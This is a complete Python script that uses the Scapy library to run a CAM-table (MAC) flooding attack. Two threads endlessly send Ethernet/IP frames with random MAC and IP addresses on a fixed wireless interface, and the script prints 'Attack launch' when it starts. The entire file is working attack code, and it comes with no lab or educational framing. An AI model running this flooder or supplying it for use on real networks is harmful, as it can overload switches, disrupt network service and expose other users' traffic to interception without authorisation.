#!/usr/bin/env python3

from scapy.volatile import RandIP, RandMAC
from scapy.layers.inet import IP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp
from threading import Thread


THREAD_COUNT = 2
IFACE = "wlo1"


class CamFlooding():

    def __init__(self, index: int) -> None:
        self.thread_index = index

    def exploit(self) -> None:
        while True:
            #print(self.thread_index, flush=True)
            packet = Ether(src=RandMAC(), dst=RandMAC())/IP(src=RandIP(), dst=RandIP())
            sendp(packet, verbose=False, iface=IFACE)
            continue

def main():
    print("[+] Attack launch")

    #cam_flooding = CamFlooding()
    threads = [Thread(target=CamFlooding(_).exploit) for _ in range(THREAD_COUNT)]
    
    # Launch Thread
    for _ in threads:
        _.start()
    
    for _ in threads:
        _.join()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("[+] Attack stoped")
        exit(0)
